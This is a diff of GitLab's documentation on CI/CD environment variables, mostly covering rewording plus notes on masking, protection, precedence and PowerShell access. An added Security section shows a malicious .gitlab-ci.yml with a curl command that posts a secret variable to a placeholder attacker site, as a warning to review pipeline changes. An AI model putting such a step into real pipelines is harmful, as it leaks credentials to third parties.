@@ -12,10 +12,11 @@ affect the way running processes behave on an operating
 system.
 
 Environment variables are part of the environment in which a process runs.
-For example, a running process can query the value of the
-`TEMP` environment variable to discover a suitable location
-to store temporary files, or to define a `URL` for a database
-that can be reused in different scripts.
+For example, a running process could:
+
+- Use the value of a `TEMP` environment variable to know the correct location
+  to store temporary files.
+- Use a `DATABASE_URL` variable for the URL to a database that can be reused in different scripts.
 
 Variables are useful for customizing your jobs in GitLab CI/CD.
 When you use variables, you don't have to hard-code values.
@@ -62,22 +63,6 @@ job `test_variable`, which is `test`:
 
 ![Output `$CI_JOB_STAGE`](img/ci_job_stage_output_example.png)
 
-As another example, let's say you're using your own GitLab
-instance and you want to know what domain your GitLab Pages are
-served under. You can call it by using the predefined
-variable `$CI_PAGES_DOMAIN` in your script:
-
-```yaml
-pages:
-  script:
-    - ...
-    - echo $CI_PAGES_DOMAIN
-```
-
-For GitLab.com users, the output is `gitlab.io`. For your
-private instance, the output is whatever your sysadmin has
-defined.
-
 ## Custom environment variables
 
 When you need a specific custom environment variable, you can
@@ -103,8 +88,8 @@ variables:
 You can then call its value in your script:
 
 ```yaml
-  script:
-    - echo "$TEST"
+script:
+  - echo "$TEST"
 ```
 
 For more details, see [`.gitlab-ci.yml` defined variables](#gitlab-ciyml-defined-variables).
@@ -131,15 +116,34 @@ After you set a variable, call it from the `.gitlab-ci.yml` file:
 test_variable:
   stage: test
   script:
-    - echo $CI_JOB_STAGE # calls a predefined variable
-    - echo $TEST # calls a custom variable of type `env_var`
-    - echo $GREETING # calls a custom variable of type `file` that contains the path to the temp file
-    - cat $GREETING # the temp file itself contains the variable value
+    - echo $CI_JOB_STAGE  # calls a predefined variable
+    - echo $TEST          # calls a custom variable of type `env_var`
+    - echo $GREETING      # calls a custom variable of type `file` that contains the path to the temp file
+    - cat $GREETING       # the temp file itself contains the variable value
 ```
 
 The output is:
 
 ![Output custom variable](img/custom_variables_output.png)
+
+Variables can only be updated or viewed by project members with [maintainer permissions](../../user/permissions.md#project-members-permissions).
+
+#### Security
+
+Malicious code pushed to your `.gitlab-ci.yml` file could compromise your variables and send them to a third party server regardless of the masked setting. If the pipeline runs on a [protected branch](../../user/project/protected_branches.md) or [protected tag](../../user/project/protected_tags.md), it could also compromise protected variables.
+
+All merge requests that introduce changes to `.gitlab-ci.yml` should be reviewed carefully before:
+
+- [Running a pipeline in the parent project for a merge request submitted from a forked project](../merge_request_pipelines/index.md#run-pipelines-in-the-parent-project-for-merge-requests-from-a-forked-project).
+- Merging the changes.
+
+Here is a simplified example of a malicious `.gitlab-ci.yml`:
+
+```yaml
+build:
+  script:
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+```
 
 ### Custom environment variables of type Variable
 
@@ -162,8 +166,8 @@ You can use tools like [the AWS CLI](https://docs.aws.amazon.com/cli/latest/user
 and [`kubectl`](https://kubernetes.io/docs/concepts/configuration/organize-cluster-access-kubeconfig/#the-kubeconfig-environment-variable)
 to customize your configuration by using **File** type variables.
 
-In the past, a common pattern was to read the value of a CI variable, save it in a file, and then
-use the newly created file in your script:
+Previously, a common pattern was to read the value of a CI variable, save it in a file, and then
+use that file in your script:
 
 ```shell
 # Read certificate stored in $KUBE_CA_PEM variable and save it in a new file
@@ -215,8 +219,8 @@ You can't mask variables that don't meet these requirements.
 > Introduced in GitLab 9.3.
 
 Variables can be protected. When a variable is
-protected, it is securely passed to pipelines running on
-[protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md) only. The other pipelines do not get
+protected, it is only passed to pipelines running on
+[protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md). The other pipelines do not get
 the protected variable.
 
 To protect a variable:
@@ -227,8 +231,7 @@ To protect a variable:
 1. Select the **Protect variable** check box.
 1. Click **Update variable**.
 
-The variable is available for all subsequent pipelines. Protected variables can only
-be updated or viewed by project members with [maintainer permissions](../../user/permissions.md#project-members-permissions).
+The variable is available for all subsequent pipelines.
 
 ### Custom variables validated by GitLab
 
@@ -240,7 +243,7 @@ Some variables are listed in the UI so you can choose them more quickly.
 | `AWS_DEFAULT_REGION`    | Any                                                | 12.10         |
 | `AWS_SECRET_ACCESS_KEY` | Any                                                | 12.10         |
 
-NOTE: **Note:**
+CAUTION: **Caution:**
 When you store credentials, there are security implications. If you are using AWS keys,
 for example, follow their [best practices](https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html).
 
@@ -270,11 +273,11 @@ job_name:
 
 ### PowerShell
 
-To access environment variables in a **Windows PowerShell** environment, prefix
-the variable name with (`$env:`). For environment variables set by GitLab CI, including those set by [`variables`](https://gitlab.com/gitlab-org/gitlab/blob/master/doc/ci/yaml/README.md#variables)
-parameter, they can also be accessed by prefixing the variable name with (`$`)
-as of [GitLab Runner 1.0.0](https://gitlab.com/gitlab-org/gitlab-runner/-/commit/abc44bb158008cd3a49c0d8173717c38dadb29ae#47afd7e8f12afdb8f0246262488f24e6dd071a22).
-System set environment variables however must be accessed using (`$env:`).
+To access variables in a **Windows PowerShell** environment, including system set
+environment variables, prefix the variable name with (`$env:`). Environment variables
+set by GitLab CI can also be accessed by prefixing the variable name with (`$`) with
+[GitLab Runner 1.0.0](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/68)
+and later.
 
 ```yaml
 job_name:
@@ -368,9 +371,6 @@ export GITLAB_USER_ID="42"
 
 ## `.gitlab-ci.yml` defined variables
 
-NOTE: **Note:**
-This feature requires GitLab Runner 0.5.0 or higher and GitLab 7.14 or higher.
-
 You can add variables that are set in the build environment to `.gitlab-ci.yml`.
 These variables are saved in the repository, and they
 are meant to store non-sensitive project configuration, like `RAILS_ENV` or
@@ -410,10 +410,12 @@ script:
 
 > Introduced in GitLab 9.4.
 
-You can define per-project or per-group variables
-that are set in the pipeline environment. Group-level variables are stored out of
-the repository (not in `.gitlab-ci.yml`) and are securely passed to GitLab Runner,
-which makes them available during a pipeline run. For Premium users who do **not** use an external key store or who use GitLab's [integration with HashiCorp Vault](../examples/authenticating-with-hashicorp-vault/index.md), we recommend using group environment variables to store secrets like passwords, SSH keys, and credentials.
+You can define per-project or per-group variables that are set in the pipeline environment. Group-level variables are stored out of the repository (not in `.gitlab-ci.yml`). They are securely passed to GitLab Runner, which makes them available during a pipeline run.
+
+We recommend using group environment variables to store secrets (like passwords, SSH keys, and credentials) for Premium users who:
+
+- Do **not** use an external key store.
+- Use GitLab's [integration with HashiCorp Vault](../secrets/index.md).
 
 Group-level variables can be added by:
 
@@ -434,8 +436,7 @@ Once you set them, they are available for all subsequent pipelines. Any group-le
 
 Instance variables are useful for no longer needing to manually enter the same credentials repeatedly for all your projects. Instance-level variables are available to all projects and groups on the instance.
 
-NOTE: **Note:**
-The maximum number of instance-level variables is [planned to be 25](https://gitlab.com/gitlab-org/gitlab/-/issues/216097).
+In GitLab 13.1 and later, the [maximum number of instance-level variables is 25](https://gitlab.com/gitlab-org/gitlab/-/issues/216097).
 
 You can define instance-level variables via the UI or [API](../../api/instance_level_ci_variables.md).
 
@@ -445,7 +446,7 @@ To add an instance-level variable:
 1. Click the **Add variable** button, and fill in the details:
 
    - **Key**: Must be one line, using only letters, numbers, or `_` (underscore), with no spaces.
-   - **Value**: [Since GitLab 13.3](https://gitlab.com/gitlab-org/gitlab/-/issues/220028), 10,000 characters allowed. This is also bounded by the limits of the selected runner operating system. In GitLab 13.0 to 13.2, 700 characters allowed.
+   - **Value**: [In GitLab 13.3 and later](https://gitlab.com/gitlab-org/gitlab/-/issues/220028), 10,000 characters allowed. This is also bounded by the limits of the selected runner operating system. In GitLab 13.0 to 13.2, 700 characters allowed.
    - **Type**: `File` or `Variable`.
    - **Protect variable** (Optional): If selected, the variable is only available in pipelines that run on protected branches or tags.
    - **Mask variable** (Optional): If selected, the variable's **Value** is not shown in job logs. The variable is not saved if the value does not meet the [masking requirements](#masked-variable-requirements).
@@ -493,7 +494,7 @@ build:
 deploy:
   stage: deploy
   script:
-    - echo $BUILD_VERSION # => hello
+    - echo $BUILD_VERSION  # => hello
   dependencies:
     - build
 ```
@@ -512,7 +513,7 @@ build:
 deploy:
   stage: deploy
   script:
-    - echo $BUILD_VERSION # => hello
+    - echo $BUILD_VERSION  # => hello
   needs:
     - job: build
       artifacts: true
@@ -529,6 +530,7 @@ The order of precedence for variables is (from highest to lowest):
    and [manual pipeline run variables](#override-a-variable-by-manually-running-a-pipeline).
 1. Project-level [variables](#custom-environment-variables) or [protected variables](#protect-a-custom-variable).
 1. Group-level [variables](#group-level-environment-variables) or [protected variables](#protect-a-custom-variable).
+1. Instance-level [variables](#instance-level-cicd-environment-variables) or [protected variables](#protect-a-custom-variable).
 1. [Inherited environment variables](#inherit-environment-variables).
 1. YAML-defined [job-level variables](../yaml/README.md#variables).
 1. YAML-defined [global variables](../yaml/README.md#variables).
@@ -547,12 +549,11 @@ variables take precedence over those defined in `.gitlab-ci.yml`.
 
 Variable names are limited by the underlying shell used to execute scripts (see [available shells](https://docs.gitlab.com/runner/shells/index.html).
 Each shell has its own unique set of reserved variable names.
-You also want to keep in mind the [scope of environment variables](where_variables_can_be_used.md) to ensure a variable is defined in the scope
-in which you wish to use it.
+Keep in mind the [scope of environment variables](where_variables_can_be_used.md) to ensure a variable is defined in the scope in which you wish to use it.
 
 ## Where variables can be used
 
-Click [here](where_variables_can_be_used.md) for a section that describes where and how the different types of variables can be used.
+[This section](where_variables_can_be_used.md) describes where and how the different types of variables can be used.
 
 ## Advanced use
 
@@ -590,8 +591,8 @@ then available as environment variables on the running application
 container.
 
 CAUTION: **Caution:**
-Variables with multi-line values are not currently supported due to
-limitations with the current Auto DevOps scripting environment.
+Variables with multi-line values are not supported due to
+limitations with the Auto DevOps scripting environment.
 
 ### Override a variable by manually running a pipeline
 
@@ -682,9 +683,10 @@ Examples:
 - `$VARIABLE == ""`
 - `$VARIABLE != ""` (introduced in GitLab 11.11)
 
-If you want to check whether a variable is defined, but is empty, you can
-simply compare it against an empty string, like `$VAR == ''` or non-empty
-string `$VARIABLE != ""`.
+To check if a variable is defined but empty, compare it to:
+
+- An empty string: `$VARIABLE == ''`
+- A non-empty string: `$VARIABLE != ""`
 
 #### Comparing two variables
 
@@ -700,9 +702,8 @@ of these variables.
 
 Example: `$STAGING`
 
-If you only want to create a job when there is some variable present,
-which means that it is defined and non-empty, you can simply use
-variable name as an expression, like `$STAGING`. If `$STAGING` variable
+To create a job when there is some variable present, meaning it is defined and non-empty,
+use the variable name as an expression, like `$STAGING`. If the `$STAGING` variable
 is defined, and is non empty, expression evaluates to `true`.
 `$STAGING` value needs to be a string, with length higher than zero.
 Variable that contains only whitespace characters is not an empty variable.
@@ -744,7 +745,11 @@ so `&&` is evaluated before `||`.
 
 #### Parentheses
 
-> [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/230938) in GitLab 13.3
+> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/230938) in GitLab 13.3
+> - It's deployed behind a feature flag, enabled by default.
+> - It's enabled on GitLab.com.
+> - It's recommended for production use.
+> - For GitLab self-managed instances, GitLab administrators can opt to [disable it](#enable-or-disable-parenthesis-support-for-variables). **(CORE ONLY)**
 
 It is possible to use parentheses to group conditions. Parentheses have the highest
 precedence of all operators. Expressions enclosed in parentheses are evaluated first,
@@ -760,20 +765,22 @@ Examples:
 - `($VARIABLE1 =~ /^content.*/ || $VARIABLE2 =~ /thing$/) && $VARIABLE3`
 - `$CI_COMMIT_BRANCH == "my-branch" || (($VARIABLE1 == "thing" || $VARIABLE2 == "thing") && $VARIABLE3)`
 
-The feature is currently deployed behind a feature flag that is **enabled by default**.
+##### Enable or disable parenthesis support for variables **(CORE ONLY)**
+
+The feature is deployed behind a feature flag that is **enabled by default**.
 [GitLab administrators with access to the GitLab Rails console](../../administration/feature_flags.md)
 can opt to disable it for your instance.
-
-To enable it:
-
-```ruby
-Feature.enable(:ci_if_parenthesis_enabled)
-```
 
 To disable it:
 
 ```ruby
 Feature.disable(:ci_if_parenthesis_enabled)
+```
+
+To enable it:
+
+```ruby
+Feature.enable(:ci_if_parenthesis_enabled)
 ```
 
 ### Storing regular expressions in variables
@@ -795,8 +802,7 @@ NOTE: **Note:**
 The available regular expression syntax is limited. See [related issue](https://gitlab.com/gitlab-org/gitlab/-/issues/35438)
 for more details.
 
-If needed, you can use a test pipeline to determine whether a regular expression will
-work in a variable. The example below tests the `^mast.*` regular expression directly,
+If needed, you can use a test pipeline to determine whether a regular expression works in a variable. The example below tests the `^mast.*` regular expression directly,
 as well as from within a variable:
 
 ```yaml
@@ -831,9 +837,7 @@ from being leaked into the log unless your script writes them to the screen.
 
 If a job isn't working as expected, this can make the problem difficult to
 investigate; in these cases, you can enable debug tracing in `.gitlab-ci.yml`.
-Available on GitLab Runner v1.7+, this feature enables the shell's execution
-log, resulting in a verbose job log listing all commands that were run,
-variables that were set, and so on.
+Available on GitLab Runner v1.7+, this feature enables the shell's execution log. This results in a verbose job log listing all commands that were run, variables that were set, and so on.
 
 Before enabling this, you should ensure jobs are visible to
 [team members only](../../user/permissions.md#project-features). You should
